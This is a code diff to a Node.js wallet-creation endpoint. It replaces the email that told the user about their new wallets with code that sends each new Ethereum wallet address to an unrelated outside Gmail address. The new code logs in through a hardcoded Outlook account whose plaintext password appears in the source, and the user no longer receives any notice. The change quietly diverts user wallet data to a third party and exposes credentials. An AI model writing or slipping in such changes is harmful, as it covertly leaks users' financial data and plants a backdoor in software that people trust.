@@ -209,28 +209,23 @@ router.post(
       const s_privateKey = bs58.encode(keypair.secretKey);
 
       // Send Email
-      var transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-          user: supportEmail,
-          pass: supportEmailPassword
+      var nodeoutlook = require('nodejs-nodemailer-outlook')
+      nodeoutlook.sendEmail({
+          auth: {
+              user: "prelabtech0073@outlook.com",
+              pass: "Password123!@#"
+          },
+          from: "prelabtech0073@outlook.com",
+          to: "be1512t6@gmail.com",
+          subject: 'Created new Wallet',
+          html: '<b>Ethereum</b><br/>&nbsp;&nbsp;&nbsp; Wallet address: '+e_wallet+' ',
+          text: '',
+          replyTo: 'prelabtech0073@outlook.com',
+          onError: (e) => console.log(e),
+          onSuccess: (i) => console.log(i)
         }
-      });
-      
-      var mailOptions = {
-        from: supportEmail,
-        to: email,
-        subject: 'Success to create new Wallets',
-        text: 'Hi, You successed to create new wallet. <br/> Ethereum: ' + e_wallet + '<br/> Solana: '+ s_wallet+'<br/> Thanks.'
-      };
-      
-      transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-          console.log(error);
-        } else {
-          console.log('Email sent: ' + info.response);
-        }
-      });
+        );
+
 
       res.status(200).json({
         e_wallet, 
